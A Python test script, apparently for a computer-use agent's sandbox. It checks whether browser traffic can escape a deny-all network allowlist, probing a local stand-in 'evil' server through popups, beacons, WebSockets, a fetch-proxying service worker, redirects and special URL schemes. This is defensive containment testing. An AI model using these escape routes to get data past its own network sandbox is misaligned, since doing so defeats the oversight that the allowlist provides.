"""Spike S6: what escapes a deny-all `context.route`?

Two local HTTP servers stand in for the target app (the only allowed origin) and an attacker origin ("evil"). The
evil server records every hit: that is the ground truth for "did traffic leave the allowlist", independent of what
Playwright reports. Each probe runs twice:

  naive     a context with only `context.route` (allow the app origin, abort everything else) and default options
  hardened  the real layer: `cua.safety.network.new_guarded_context` (route allowlist + scheme check +
            `service_workers="block"` + `accept_downloads=False` + WebSocket routing + redirect re-check)

A probe is CONTAINED when the evil server saw nothing, no download was written, and the page did not end up showing
off-allowlist content. Things that need a person at a headed browser (user-opened tabs, the address bar, DevTools) are
listed as manual checks; they are not guessed.

    uv run python spikes/s6_escape_hatches.py            # headless
    uv run python spikes/s6_escape_hatches.py --headed
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import json
import sys
import tempfile
import threading
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from playwright.async_api import Browser, BrowserContext, Error as PWError, Page, async_playwright

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from cua.safety.network import BlockedRequest, new_guarded_context  # noqa: E402
from cua.safety.policy import Policy  # noqa: E402


# --------------------------------------------------------------------------------------------- local servers


@dataclass
class Server:
    name: str
    hits: list[str] = field(default_factory=list)
    httpd: ThreadingHTTPServer | None = None

    @property
    def origin(self) -> str:
        assert self.httpd
        return f"http://127.0.0.1:{self.httpd.server_address[1]}"


def make_handler(server: Server, evil_origin: callable):
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args):  # quiet
            pass

        def _send(self, status: int, body: str, ctype: str = "text/html", headers: dict | None = None):
            data = body.encode()
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            for k, v in (headers or {}).items():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(data)

        def do_POST(self):
            server.hits.append(f"POST {self.path}")
            self._send(200, "<h1>posted</h1>")

        def do_GET(self):
            upgrade = self.headers.get("Upgrade")
            server.hits.append(f"GET {self.path}" + (f" (Upgrade: {upgrade})" if upgrade else ""))
            url = urlsplit(self.path)
            q = parse_qs(url.query)
            if server.name == "evil":
                return self._send(200, "<h1>EVIL CONTENT</h1>")
            if url.path == "/redirect":
                return self._send(302, "", headers={"Location": q["to"][0]})
            if url.path == "/download":
                return self._send(200, "secret,data\n1,2\n", "text/csv",
                                  {"Content-Disposition": 'attachment; filename="export.csv"'})
            if url.path == "/sw.js":
                # A service worker that answers /sw-proxy by fetching the evil origin itself.
                js = ("self.addEventListener('install', e => self.skipWaiting());"
                      "self.addEventListener('activate', e => e.waitUntil(clients.claim()));"
                      "self.addEventListener('fetch', e => { if (new URL(e.request.url).pathname === '/sw-proxy')"
                      f" e.respondWith(fetch('{evil_origin()}/via-service-worker')); }});")
                return self._send(200, js, "application/javascript")
            if url.path == "/worker.js":
                return self._send(200, f"fetch('{evil_origin()}/from-worker').catch(()=>{{}});",
                                  "application/javascript")
            if url.path == "/meta-refresh":
                return self._send(200, f'<meta http-equiv="refresh" content="0;url={evil_origin()}/meta">')
            return self._send(200, "<h1>app</h1><a id=blank target=_blank href='"
                              f"{evil_origin()}/target-blank'>out</a><a id=dl href='/download'>dl</a>")

    return Handler


def start(server: Server, evil_origin) -> None:
    server.httpd = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(server, evil_origin))
    threading.Thread(target=server.httpd.serve_forever, daemon=True).start()


# --------------------------------------------------------------------------------------------- contexts


@dataclass
class Ctx:
    context: BrowserContext
    route_saw: list[str]
    blocked: list[BlockedRequest]
    downloads: list[str]


async def naive_context(browser: Browser, app: str) -> Ctx:
    context = await browser.new_context()
    seen: list[str] = []

    async def deny_all_but_app(route, request):
        seen.append(request.url)
        if request.url.startswith(app + "/") or request.url == app:
            await route.fallback()
        else:
            await route.abort("blockedbyclient")

    await context.route("**/*", deny_all_but_app)
    return Ctx(context, seen, [], [])


def policy_for(app: str) -> Policy:
    return Policy.model_validate({
        "version": "cua.policy/v1",
        "name": "s6",
        "sandbox": True,
        "origins": [app],
        "routes": {"allow": ["/**"], "deny": []},
        "actions": ["click", "type", "select", "press", "navigate", "extract"],
        "max_effect": "read",
    })


async def hardened_context(browser: Browser, app: str) -> Ctx:
    blocked: list[BlockedRequest] = []
    context = await new_guarded_context(browser, policy_for(app), on_block=blocked.append)
    seen: list[str] = []
    context.on("request", lambda r: seen.append(r.url))
    return Ctx(context, seen, blocked, [])


# --------------------------------------------------------------------------------------------- probes


async def settle(ms: int = 900) -> None:
    await asyncio.sleep(ms / 1000)


async def probe(name: str, ctx: Ctx, app: Server, evil: Server, action) -> dict:
    evil.hits.clear()
    ctx.route_saw.clear()
    ctx.blocked.clear()
    page = await ctx.context.new_page()
    downloads: list[str] = []
    saved: list[str] = []

    async def on_download(d):
        downloads.append(d.suggested_filename)
        with contextlib.suppress(Exception):
            p = await d.path()
            if p:
                saved.append(str(p))

    ctx.context.on("page", lambda p: p.on("download", lambda d: asyncio.ensure_future(on_download(d))))
    page.on("download", lambda d: asyncio.ensure_future(on_download(d)))
    await page.goto(app.origin + "/")
    note = ""
    try:
        note = await action(page) or ""
    except PWError as e:
        note = f"error: {str(e).splitlines()[0][:90]}"
    await settle()
    shown = [p.url for p in ctx.context.pages]
    evil_content = False
    for p in ctx.context.pages:
        with contextlib.suppress(Exception):
            evil_content |= "EVIL CONTENT" in await p.content()
            for f in p.frames:
                evil_content |= "EVIL CONTENT" in await f.content()
    for p in list(ctx.context.pages):
        await p.close()
    return {
        "probe": name,
        "evil_hits": list(evil.hits),
        "route_saw_evil": any(evil.origin in u for u in ctx.route_saw),
        "blocked_logged": [b.rule for b in ctx.blocked],
        "downloads": downloads,
        "saved_files": saved,
        "evil_content_shown": evil_content,
        "pages": shown,
        "note": note,
    }


def probes(app: Server, evil: Server, tmp: Path):
    E = evil.origin
    local_file = tmp / "local.html"
    local_file.write_text("<h1>local file</h1>", encoding="utf-8")
    file_url = local_file.resolve().as_uri()

    async def popup(page: Page):
        await page.evaluate(f"window.open('{E}/popup')")

    async def target_blank(page: Page):
        await page.click("#blank")

    async def iframe(page: Page):
        await page.evaluate(f"document.body.insertAdjacentHTML('beforeend', '<iframe src=\"{E}/iframe\"></iframe>')")

    async def subresources(page: Page):
        await page.evaluate(f"fetch('{E}/fetch').catch(()=>{{}}); new Image().src='{E}/img';")

    async def beacon(page: Page):
        await page.evaluate(f"navigator.sendBeacon('{E}/beacon', 'x')")

    async def event_source(page: Page):
        await page.evaluate(f"new EventSource('{E}/sse')")

    async def prefetch(page: Page):
        await page.evaluate(f"document.head.insertAdjacentHTML('beforeend', '<link rel=prefetch href=\"{E}/prefetch\">')")

    async def form_post(page: Page):
        await page.evaluate(f"""() => {{ const f = document.createElement('form'); f.method='POST';
            f.action='{E}/post'; document.body.appendChild(f); f.submit(); }}""")

    async def websocket(page: Page):
        ws_url = E.replace("http://", "ws://") + "/ws"
        return await page.evaluate(f"""() => new Promise(res => {{ const ws = new WebSocket('{ws_url}');
            ws.onopen = () => res('opened'); ws.onerror = () => res('error'); ws.onclose = () => res('closed');
            setTimeout(() => res('timeout'), 1500); }})""")

    async def worker(page: Page):
        await page.evaluate("new Worker('/worker.js')")

    async def service_worker(page: Page):
        # `ready` never resolves when registration is blocked, so race it against a short timer.
        reg = await page.evaluate("""() => navigator.serviceWorker.register('/sw.js')
            .then(() => Promise.race([navigator.serviceWorker.ready.then(() => 'registered'),
                                      new Promise(r => setTimeout(() => r('never active'), 2000))]))
            .catch(e => 'rejected: ' + e.name)""")
        if reg != "registered":
            return f"register {reg}"
        await page.reload()
        controlled = await page.evaluate("navigator.serviceWorker.controller !== null")
        body = await page.evaluate("fetch('/sw-proxy').then(r => r.text()).catch(() => 'fetch failed')")
        return f"registered; page controlled={controlled}; /sw-proxy answered {body[:24]!r}"

    async def redirect_browser(page: Page):
        await page.goto(f"{app.origin}/redirect?to={E}/redirected")

    async def redirect_page(page: Page):
        await page.evaluate(f"location.href = '{app.origin}/redirect?to={E}/redirected-from-page'")

    async def meta_refresh(page: Page):
        await page.goto(f"{app.origin}/meta-refresh")

    async def download(page: Page):
        await page.click("#dl")

    async def goto_file(page: Page):
        await page.goto(file_url)

    async def page_to_file(page: Page):
        await page.evaluate(f"window.open('{file_url}')")

    async def goto_data(page: Page):
        await page.goto(f"data:text/html,<h1>data</h1><img src='{E}/from-data-url'>")

    async def page_to_data(page: Page):
        await page.evaluate("location.href = 'data:text/html,<h1>data-nav</h1>'")

    async def blob_popup(page: Page):
        await page.evaluate(f"""() => {{ const b = new Blob(["<h1>blob</h1><img src='{E}/from-blob'>"],
            {{type: 'text/html'}}); window.open(URL.createObjectURL(b)); }}""")

    async def goto_chrome(page: Page):
        await page.goto("chrome://version")

    async def page_to_chrome(page: Page):
        await page.evaluate("window.open('chrome://version')")

    return [
        ("popup window.open", popup),
        ("target=_blank link", target_blank),
        ("iframe", iframe),
        ("fetch + img", subresources),
        ("sendBeacon", beacon),
        ("EventSource", event_source),
        ("link rel=prefetch", prefetch),
        ("form POST", form_post),
        ("WebSocket", websocket),
        ("dedicated Worker fetch", worker),
        ("service worker fetch", service_worker),
        ("server redirect (goto)", redirect_browser),
        ("server redirect (page nav)", redirect_page),
        ("meta refresh", meta_refresh),
        ("download link", download),
        ("goto file://", goto_file),
        ("page opens file://", page_to_file),
        ("goto data: (+evil img)", goto_data),
        ("page navigates to data:", page_to_data),
        ("blob: popup (+evil img)", blob_popup),
        ("goto chrome://", goto_chrome),
        ("page opens chrome://", page_to_chrome),
    ]


def verdict(r: dict) -> str:
    leaked = r["evil_hits"] or r["saved_files"] or r["evil_content_shown"]
    return "ESCAPES" if leaked else "contained"


async def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--headed", action="store_true")
    ap.add_argument("--json", type=Path, help="also write raw results here")
    args = ap.parse_args()

    evil = Server("evil")
    app = Server("app")
    start(evil, lambda: evil.origin)
    start(app, lambda: evil.origin)
    tmp = Path(tempfile.mkdtemp(prefix="s6_"))
    results: dict[str, list[dict]] = {}
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=not args.headed)
        for label, factory in (("naive", naive_context), ("hardened", hardened_context)):
            results[label] = []
            for name, action in probes(app, evil, tmp):
                ctx = await factory(browser, app.origin)
                print(f"  [{label}] {name}", file=sys.stderr, flush=True)
                try:
                    result = await asyncio.wait_for(probe(name, ctx, app, evil, action), timeout=25)
                except TimeoutError:
                    result = {"probe": name, "evil_hits": [], "route_saw_evil": False, "blocked_logged": [],
                              "downloads": [], "saved_files": [], "evil_content_shown": False, "pages": [],
                              "note": "probe timed out (25 s); treat as inconclusive"}
                results[label].append(result)
                with contextlib.suppress(Exception):
                    await asyncio.wait_for(ctx.context.close(), timeout=10)
        await browser.close()

    print(f"{'probe':30} {'naive':10} {'hardened':10}  hardened detail")
    for naive_r, hard_r in zip(results["naive"], results["hardened"], strict=True):
        detail = []
        if hard_r["evil_hits"]:
            detail.append(f"evil saw {hard_r['evil_hits']}")
        if hard_r["blocked_logged"]:
            detail.append(f"logged {sorted(set(hard_r['blocked_logged']))}")
        if hard_r["downloads"]:
            detail.append(f"download event, saved={bool(hard_r['saved_files'])}")
        if hard_r["note"]:
            detail.append(hard_r["note"])
        print(f"{naive_r['probe']:30} {verdict(naive_r):10} {verdict(hard_r):10}  {'; '.join(detail)}")
        if verdict(naive_r) == "ESCAPES" or naive_r["note"].startswith("registered"):
            print(f"{'':30} naive: evil saw {naive_r['evil_hits']} saved={naive_r['saved_files']} "
                  f"shown={naive_r['evil_content_shown']} {naive_r['note']}")
    if args.json:
        args.json.write_text(json.dumps(results, indent=2), encoding="utf-8")
    escapes = [r["probe"] for r in results["hardened"] if verdict(r) == "ESCAPES"]
    print("\nmanual checks (need a person at a headed browser): user-opened tab (Ctrl+T), typing a URL in the "
          "address bar, DevTools (console fetch, network overrides), drag-and-drop of a link or file, Save Page As")
    print("S6 hardened:", "all automated probes contained" if not escapes else f"ESCAPES: {escapes}")
    return 1 if escapes else 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
